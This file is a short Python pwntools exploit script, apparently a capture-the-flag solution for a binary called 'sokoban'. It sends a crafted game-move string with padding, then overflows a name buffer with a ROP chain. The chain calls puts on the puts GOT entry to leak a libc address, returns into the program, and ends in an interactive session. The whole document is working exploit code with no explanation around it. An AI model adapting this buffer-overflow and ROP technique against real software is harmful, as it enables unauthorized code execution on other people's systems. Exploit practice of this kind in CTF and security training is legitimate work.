from pwn import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-peda
b* 0x400ef0
continue
'''.format(**locals())

#Binary filename
exe = './sokoban'
elf = context.binary = ELF(exe, checksec=False)
#context.log_level = 'debug'

################################################################

p = start()

pop_rdi = 0x0000000000400f63

road = b"ddwwwwwssdwwwassssdwwwwsssssdwwwww"

junk = b"da" * 0x140 + b"aaaa"

payload = junk + road
p.recvuntil(b"********\n")
p.sendline(payload)

payload = b"\x00"*0x138 + p64(pop_rdi) + p64(elf.got.puts) + p64(elf.sym['puts'])
payload += p64(0x400bf3)
p.recvuntil(b"name:")
p.sendline(payload)
print(p.recvline())

p.interactive()
